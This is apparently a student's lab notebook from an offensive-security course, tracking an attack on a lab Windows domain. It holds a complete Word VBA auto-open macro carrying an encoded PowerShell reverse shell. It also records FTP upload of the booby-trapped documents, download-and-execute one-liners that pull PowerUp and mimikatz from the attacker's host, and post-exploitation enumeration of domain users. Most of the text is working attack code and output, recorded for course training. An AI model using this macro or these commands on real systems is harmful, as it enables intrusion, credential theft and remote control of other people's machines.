```
18:29 - 18Feb2023

┌──(root㉿kali)-[/home/kali]
└─# nmap -Pn -sV -sC 10.11.1.20-24
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-18 23:19 EST

kali
-> 10.11.1.21
--> 10.11.1.22
--->
---->

# helpful
https://www.noobsec.net/privesc-windows/
checklist for AD

# UAC BYPASS PRIV ESC, need to do more research 
https://juggernaut-sec.com/uac-bypass/
```

```
# found username and password for ftp server editor:MyEditWork
# refer to image 1
18:33

# on ftp with creds
┌──(root㉿kali)-[/home/kali]
└─# ftp 10.11.1.21 
Connected to 10.11.1.21.
220-FileZilla Server 0.9.60 beta
220-written by Tim Kosse (tim.kosse@filezilla-project.org)
220 Please visit https://filezilla-project.org/
Name (10.11.1.21:kali): editor
331 Password required for editor
Password: 
230 Logged on
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 

# nothing on box with ls

# able to put on a test shell.bat but it gets deleted every few minutes.
ftp> put shell.bat
local: shell.bat remote: shell.bat
229 Entering Extended Passive Mode (|||57644|)
150 Opening data channel for file upload to server of "/shell.bat"
100% |***********************************************************************************************************************************************************************************************|  1584        3.12 MiB/s    00:00 ETA
226 Successfully transferred "/shell.bat"
1584 bytes sent in 00:00 (10.99 KiB/s)
ftp> ls
229 Entering Extended Passive Mode (|||51066|)
150 Opening data channel for directory listing of "/"
-rwxr-xr-x 1 ftp ftp           1584 Feb 18 20:39 shell.bat

```

```
# macro used - ip listener 192.168.119.124 port 1234
# image 2
# saved file in C:\Users\jorde\Desktop\test.doc on main windows.
# lots of difficulty saving this file, had to disable real time protection in virus & threat protection on my windows box as well as disable the firewall on the domain.
Sub AutoOpen()
    MyMacro
End Sub
Sub Document_Open()
    MyMacro
End Sub
Sub MyMacro()
    Dim Str As String
    Str = Str + "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAt"
    Str = Str + "AE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAF"
    Str = Str + "MAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIA"
    Str = Str + "MQAwAC4AMQAzAC4AMQAzAC4AMQAyADUAIgAsADEAMgAzADQAKQ"
    Str = Str + "A7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAu"
    Str = Str + "AEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF"
    Str = Str + "0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUA"
    Str = Str + "fAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJA"
    Str = Str + "BzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAs"
    Str = Str + "ACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApAC"
    Str = Str + "kAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgA"
    Str = Str + "TgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQ"
    Str = Str + "BlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJ"
    Str = Str + "AEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAG"
    Str = Str + "cAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUA"
    Str = Str + "bgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQ"
    Str = Str + "AgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAg"
    Str = Str + "ACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG"
    Str = Str + "4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAA"
    Str = Str + "dwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQ"
    Str = Str + "BuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBj"
    Str = Str + "AG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AE"
    Str = Str + "IAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQA"
    Str = Str + "cwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYg"
    Str = Str + "B5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBu"
    Str = Str + "AGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoAC"
    Str = Str + "gAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
    CreateObject("Wscript.Shell").Run Str
End Sub

```

```
# created macro following previous notes on offsec AD set and copied it over to my linux workstation using below commands.
# had to ensure to close all word documents to be able to transfer the file
19:03

┌──(root㉿kali)-[/home/kali/Documents/transfer]
└─# service ssh start    

C:\Users\jorde\Desktop>pscp test.doc root@192.168.128.129:"/home/kali/tested.doc"
root@192.168.128.129's password:
test.doc                  | 32 kB |  32.5 kB/s | ETA: 00:00:00 | 100%

# had to upload file like three times.
C:\Users\jorde\Desktop>pscp Doc1.doc root@192.168.128.129:"/home/kali/"
root@192.168.128.129's password:
Doc1.doc                  | 32 kB |  32.5 kB/s | ETA: 00:00:00 | 100%

┌──(root㉿kali)-[/home/kali]
└─# service ssh stop         

┌──(root㉿kali)-[/home/kali]
└─# ls | grep tested.doc  
tested.doc
```

```
# going to attempt to login to ftp server with known creds editor:MyEditWork, upload tested.doc and setup nc.exe listener
19:05

19:37
- tested.doc did not work, going to try to upload test.docx
```

```
19:48

# tried again to upload as Doc1.doc
ftp> put Doc1.doc
local: Doc1.doc remote: Doc1.doc
229 Entering Extended Passive Mode (|||63025|)
150 Opening data channel for file upload to server of "/Doc1.doc"
100% |***********************************************************************************************************************************************************************************************| 33280      118.96 KiB/s    00:00 ETA
226 Successfully transferred "/Doc1.doc"
33280 bytes sent in 00:00 (77.21 KiB/s)
ftp> ls
229 Entering Extended Passive Mode (|||62214|)
150 Opening data channel for directory listing of "/"
-rw-r--r-- 1 ftp ftp          33280 Feb 18 21:47 Doc1.doc
226 Successfully transferred "/"

# still didnt work, updated trust center macro settings and trying again as a .docx file due to .doc not working.
# image 3

```

```
# still having issues, used command below to check my vba macro to make sure it was making it while it was transferred.

# how to install
pip install -U oletools[full]

# how to run and results.
┌──(root㉿kali)-[/home/kali]
└─# olevba Doc1.doc 
XLMMacroDeobfuscator: pywin32 is not installed (only is required if you want to use MS Excel)
olevba 0.60.1 on Python 3.10.9 - http://decalage.info/python/oletools
===============================================================================
FILE: Doc1.doc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Doc1.doc - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file: Doc1.doc - OLE stream: 'Macros/VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
    MyMacro
End Sub
Sub Document_Open()
    MyMacro
End Sub
Sub MyMacro()
    Dim Str As String
    Str = Str + "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAt"
    Str = Str + "AE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAF"
    Str = Str + "MAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIA"
    Str = Str + "MQAwAC4AMQAzAC4AMQAzAC4AMQAyADUAIgAsADEAMgAzADQAKQ"
    Str = Str + "A7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAu"
    Str = Str + "AEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF"
    Str = Str + "0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUA"
    Str = Str + "fAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJA"
    Str = Str + "BzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAs"
    Str = Str + "ACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApAC"
    Str = Str + "kAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgA"
    Str = Str + "TgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQ"
    Str = Str + "BlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJ"
    Str = Str + "AEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAG"
    Str = Str + "cAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUA"
    Str = Str + "bgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQ"
    Str = Str + "AgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAg"
    Str = Str + "ACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG"
    Str = Str + "4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAA"
    Str = Str + "dwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQ"
    Str = Str + "BuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBj"
    Str = Str + "AG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AE"
    Str = Str + "IAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQA"
    Str = Str + "cwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYg"
    Str = Str + "B5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBu"
    Str = Str + "AGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoAC"
    Str = Str + "gAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
    CreateObject("Wscript.Shell").Run Str
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Wscript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|powershell          |May run PowerShell commands                  |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

```

```
# following forums someone recommended to put multiple copies up

229 Entering Extended Passive Mode (|||63135|)
150 Opening data channel for directory listing of "/"
-rw-r--r-- 1 ftp ftp          33280 Feb 18 22:27 Doc1.doc
-rw-r--r-- 1 ftp ftp          33280 Feb 18 22:27 Doc2.doc
-rw-r--r-- 1 ftp ftp          33280 Feb 18 22:27 Doc3.doc
-rw-r--r-- 1 ftp ftp          33280 Feb 18 22:27 Doc4.doc
-rw-r--r-- 1 ftp ftp          33280 Feb 18 22:27 Doc5.doc
226 Successfully transferred "/"
# did not work
```

```
image 4, how i know the macro is working.
# syntax was fucked up, new macro below
```

```
# new and improved macro.

Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    Str = Str + "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAt"
	Str = Str + "AE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAF"
	Str = Str + "MAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIA"
	Str = Str + "MQA5ADIALgAxADYAOAAuADEAMQA5AC4AMQAyADQAIgAsADEAMg"
	Str = Str + "AzADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBl"
	Str = Str + "AG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AH"
	Str = Str + "QAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUA"
	Str = Str + "NQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIA"
	Str = Str + "A9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0"
	Str = Str + "AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAH"
	Str = Str + "QAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAA"
	Str = Str + "PQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQ"
	Str = Str + "BOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBT"
	Str = Str + "AEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AH"
	Str = Str + "IAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsA"
	Str = Str + "JABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZA"
	Str = Str + "BhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBp"
	Str = Str + "AG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgAC"
	Str = Str + "QAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsA"
	Str = Str + "IAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOw"
	Str = Str + "AkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAu"
	Str = Str + "AGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAE"
	Str = Str + "cAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIA"
	Str = Str + "KQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQ"
	Str = Str + "BuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAu"
	Str = Str + "AEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAH"
	Str = Str + "UAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMA"
	Str = Str + "ZQAoACkA"

    CreateObject("Wscript.Shell").Run Str
End Sub

```

```
# holy fuck, after fucking hours it finally worked, dummy ass mistake. Ip changed so had to generate a new PowerShell #3 (Base64) revshell on revshell.com and edit completely redo the formatting and entire macro to get the reverse shell to work.

ftp> ls
229 Entering Extended Passive Mode (|||57742|)
150 Opening data channel for directory listing of "/"
-rw-r--r-- 1 ftp ftp          33280 Feb 18 23:14 newnew.doc
226 Successfully transferred "/"
ftp> ls
229 Entering Extended Passive Mode (|||58274|)
150 Opening data channel for directory listing of "/"
-rw-r--r-- 1 ftp ftp          33280 Feb 18 23:14 newnew.doc
226 Successfully transferred "/"

# stopped ssh service
┌──(root㉿kali)-[/home/kali]
└─# service ssh stop    
```

```
# on as alice.
21:20

┌──(root㉿kali)-[/home/kali]
└─# nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.119.124] from (UNKNOWN) [10.11.1.22] 49766

PS C:\Windows\system32> whoami
svcorp\alice
PS C:\Windows\system32> 

# starting enumeration

```

```
#proof.txt
21:23

PS C:\Users\Administrator\Desktop>dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----       07/03/2019     22:03             32 proof.txt                                                             


PS C:\Users\Administrator\Desktop> type proof.txt
464a734cfa6ca2188ffaaa902f144bce
```

```
# dir in Users
21:26

PS C:\Users> dir


    Directory: C:\Users


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----       07/03/2019     22:02                Administrator                                                         
d-----       07/03/2019     22:11                alice                                                                 
d-----       04/03/2019     13:24                defaultuser0                                                          
d-----       04/03/2019     13:32                offsec                                                                
d-r---       04/03/2019     13:30                Public                                                                
d-----       07/03/2019     21:50                tris           
```

```
#net user /domain

PS C:\Users> net user /domain
The request will be processed at a domain controller for domain svcorp.com.


User accounts for \\sv-dc01.svcorp.com

-------------------------------------------------------------------------------
adam                     Administrator            alice                    
bethany                  bob                      brett                    
bruce                    carol                    cory                     
evan                     extmailservice           Guest                    
HP3service               james                    jeff                     
joe                      john                     kevin                    
krbtgt                   mike                     nicky                    
nina                     pedro                    pete                     
ralph                    sherlock                 sqlServer                
tris                     
The command completed successfully.

PS C:\Users> 
```

```
### NEED TO PRIV ESC AND BE ADMIN/SYSTEM TO RUN MIMIKATZ
```

```
# attempting to transfer PowerUp.ps1

# did not work
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.124/PowerUp.ps1', 'PowerUp.ps1')

# nope
powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.124/mimikatz.exe')

powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.124/mimikatz.exe')

# did not work
certutil -urlcache -f http://192.168.119.124:80/PowerUp.ps1

# nope
echo IEX(New-Object Net.WebClient).DownloadString('http://192.168.119.124:80/PowerUp.ps1') | powershell -noprofile -
```

```
# whoami /all shows that alice is part of the authenticated users group

PS C:\Windows\system32> whoami
svcorp\alice
PS C:\Windows\system32> whoami /all

USER INFORMATION
----------------

User Name    SID                                         
============ ============================================
svcorp\alice S-1-5-21-466546139-763938477-1796994327-1103


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes                                        
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                     Alias            S-1-5-32-544 Group used for deny only                          
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                                                    


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled

PS C:\Windows\system32> 


```



```
# powerup was working the entire time
PS C:\Users\alice> powershell.exe -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.119.124/PowerUp.ps1')"

Check                                     AbuseFunction                                                                
-----                                     -------------                                                                
User In Local Group with Admin Privileges Invoke-WScriptUACBypass -Command "..."                                       
%PATH% .dll Hijacks                       Write-HijackDll -DllPath 'C:\Users\alice\AppData\Local\Microsoft\WindowsAp...
```


```
# checking out for the day 22:22
# need to watch a youtube video on UAC BYPASS for priv esc.
# need to find a way to enable rdp and get alices creds to be able to abuse the priv esc tho because it seems to be a gui only  thing